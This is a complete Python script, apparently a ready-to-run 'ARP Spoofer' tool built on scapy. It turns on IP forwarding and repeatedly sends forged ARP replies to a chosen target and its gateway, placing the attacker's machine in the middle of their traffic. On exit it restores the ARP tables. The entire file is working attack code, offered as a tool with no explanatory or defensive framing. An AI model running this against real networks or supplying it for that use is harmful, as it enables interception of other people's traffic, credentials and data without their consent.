#!/usr/bin/env python
import scapy.all as scapy
import time
import optparse
import pyfiglet
import subprocess
import logging

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_banner():
    try:
        banner = pyfiglet.figlet_format('ARP Spoofer', font='slant')
        subprocess.call(f"echo '{banner}'", shell=True)
    except:
        banner = pyfiglet.figlet_format('ARP Spoofer', font='slant')
        print(banner)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip",
                      help="Target IP address to ARP spoof")
    parser.add_option("-g", "--gateway", dest="gateway_ip",
                      help="Gateway IP address to spoof")
    (options, arguments) = parser.parse_args()
    
    if not options.target_ip:
        parser.error("[-] Please specify a target IP address, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP address, use --help for more info")
    return options

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print(f"[-] Could not get MAC address for {ip}. Please check the IP address.")
        exit(1)

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[+] Enabled IP forwarding")
    except PermissionError:
        print("[-] Failed to enable IP forwarding. Please run with sudo.")
        exit(1)

def main():
    get_banner()
    options = get_arguments()
    
    enable_ip_forwarding()
    
    print(f"[*] Target IP: {options.target_ip}")
    print(f"[*] Gateway IP: {options.gateway_ip}")
    print("[*] Starting ARP spoofing...")
    
    try:
        target_mac = get_mac(options.target_ip)
        gateway_mac = get_mac(options.gateway_ip)
        send_packets_count = 0
        
        while True:
            spoof(options.target_ip, options.gateway_ip, target_mac)
            spoof(options.gateway_ip, options.target_ip, gateway_mac)
            send_packets_count += 2
            print(f"\r[+] Packets sent: {send_packets_count}", end="", flush=True)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ... Restoring ARP tables...")
        restore(options.target_ip, options.gateway_ip)
        restore(options.gateway_ip, options.target_ip)
        print("[+] ARP tables restored. Quitting...")
    except Exception as e:
        print(f"\n[-] An error occurred: {str(e)}")
        print("[*] Attempting to restore ARP tables...")
        restore(options.target_ip, options.gateway_ip)
        restore(options.gateway_ip, options.target_ip)

if __name__ == "__main__":
    main()